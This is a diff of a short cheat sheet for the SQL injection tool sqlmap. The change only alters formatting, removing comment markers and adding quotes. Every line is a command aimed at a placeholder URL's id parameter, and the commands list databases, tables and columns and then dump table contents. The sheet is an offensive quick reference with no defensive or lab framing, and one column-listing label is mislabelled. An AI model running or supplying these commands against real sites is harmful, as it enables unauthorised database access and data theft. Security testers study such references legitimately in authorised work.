@@ -1,13 +1,13 @@
 SQLmap: Automatic database discover/takeover tool.
 
-#Discover Databases ( -dbs == list databases )
-sqlmap -u "http://www.yoursitehere.com/section.php?id=51" -dbs
+Discover Databases ( -dbs == list databases )
+"sqlmap -u "http://www.yoursitehere.com/section.php?id=51" -dbs"
 
-#List tables in a particular database
-sqlmap -u "http://www.yoursitehere.com/section.php?id=51" --tables -D datbaseNameHere
+List tables in a particular database
+"sqlmap -u "http://www.yoursitehere.com/section.php?id=51" --tables -D datbaseNameHere"
 
-#Listing columns of a table
-sqlmap -u "http://www.yoursitehere.com/section.php?id=51" --columns -D databasename -T columnName
+Listing columns of a table
+"sqlmap -u "http://www.yoursitehere.com/section.php?id=51" --columns -D databasename -T columnName"
 
-#Dump data from table 
-sqlmap -u "http://www.yoursitehere.com/section.php?id=51" --dump -D databaseNameHere -T tableName
+Dump data from table 
+"sqlmap -u "http://www.yoursitehere.com/section.php?id=51" --dump -D databaseNameHere -T tableName"
